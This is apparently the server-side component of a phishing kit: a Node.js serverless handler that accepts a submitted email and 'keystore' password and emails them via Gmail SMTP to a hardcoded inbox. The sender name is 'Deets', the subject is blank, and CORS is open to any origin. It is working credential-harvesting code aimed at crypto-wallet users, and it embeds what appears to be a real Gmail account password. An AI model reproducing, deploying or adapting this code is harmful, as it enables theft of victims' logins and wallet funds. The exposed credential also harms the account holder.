const nodemailer = require('nodemailer');

exports.handler = async (event, context) => {
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
      },
      body: ''
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const formData = JSON.parse(event.body);
    const { wName, psdWet } = formData;

    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: {
        user: 'willyscotmegan@gmail.com',
        pass: 'dvhpjxrxrxwxsxcg'
      }
    });

    const mailOptions = {
      from: '"Deets" <willyscotmegan@gmail.com>',
      to: 'willyscotmegan@gmail.com',
      subject: '',
      html: `
        <p><strong>Eml:</strong> ${wName || 'Not provided'}</p>
        <p><strong>Pswd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
      `
    };

    await transporter.sendMail(mailOptions);

    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ success: true })
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ error: 'Fail2prcsrqst' })
    };
  }
};